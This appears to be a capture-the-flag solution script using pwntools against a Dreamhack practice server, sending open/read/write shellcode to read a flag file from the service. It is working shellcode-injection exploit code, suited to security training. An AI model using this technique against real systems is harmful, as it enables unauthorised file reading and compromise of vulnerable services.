# filename : shell_basic.py

from pwn import *

r = remote("host3.dreamhack.games", 18238)

context.update(arch = 'amd64', os = 'linux')

dir = "/home/shell_basic/flag_name_is_loooooong"

payload = ''
payload += shellcraft.open(dir)
payload += shellcraft.read('rax', 'rsp', 0x100)
payload += shellcraft.write(1, 'rsp', 0x100)

r.recvuntil("shellcode:" )
r.send(asm(payload))

r.interactive()
